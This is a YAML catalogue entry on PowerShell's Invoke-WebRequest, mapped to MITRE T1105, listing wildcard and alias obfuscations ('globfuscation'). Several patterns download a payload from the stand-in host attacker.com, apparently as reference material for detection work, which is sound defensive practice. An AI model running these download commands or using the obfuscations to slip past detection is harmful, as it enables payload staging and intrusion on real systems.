---
Name: Invoke-WebRequest
Description: "Download files or interact with web services. PowerShell's built-in HTTP client, commonly used for payload staging."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet (System.Net.WebClient wrapper)"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "& (gcm I*oke-W*R*) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Get-Command (gcm) resolves cmdlet by wildcard. I*oke matches Invoke, W*R* matches WebRequest"
  - Pattern: "& (gcm Inv?ke-WebRequest) -Uri ..."
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'o'"
  - Pattern: "& (gcm I*-W*t) -Uri ..."
    Wildcards: ["*"]
    Notes: "Abbreviated wildcards, still resolves to Invoke-WebRequest"
  - Pattern: "iwr -Uri ..."
    Wildcards: []
    Notes: "Built-in alias 'iwr' — not a glob but commonly used obfuscation"
  - Pattern: "curl -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "Alias 'curl' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
  - Pattern: "wget -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "Alias 'wget' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
  - Pattern: "& (Get-Command *Web*quest) -Uri ..."
    Wildcards: ["*"]
    Notes: "Full Get-Command with wildcards around 'Web'"
  - Pattern: "& (gcm *-WebR*) -Uri ..."
    Wildcards: ["*"]
    Notes: "Wildcard before verb and in noun"
  - Pattern: "& (gcm Invok[d-f]-WebRequest) -Uri ..."
    Wildcards: ["[d-f]"]
    Notes: "Character range matches 'e' in Invoke"
  - Pattern: "& (gal i?r) -Uri ..."
    Wildcards: ["?"]
    Notes: "Get-Alias with wildcard resolves 'iwr'"
PlatformNotes: |
  PowerShell cmdlet name resolution supports wildcards via `Get-Command`. The pattern `& (gcm Wildcard*Pattern) -Args` is idiomatic "globfuscation". The `&` operator invokes the resolved cmdlet. Aliases like `iwr`, `curl`, `wget` also resolve to Invoke-WebRequest.
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest
---
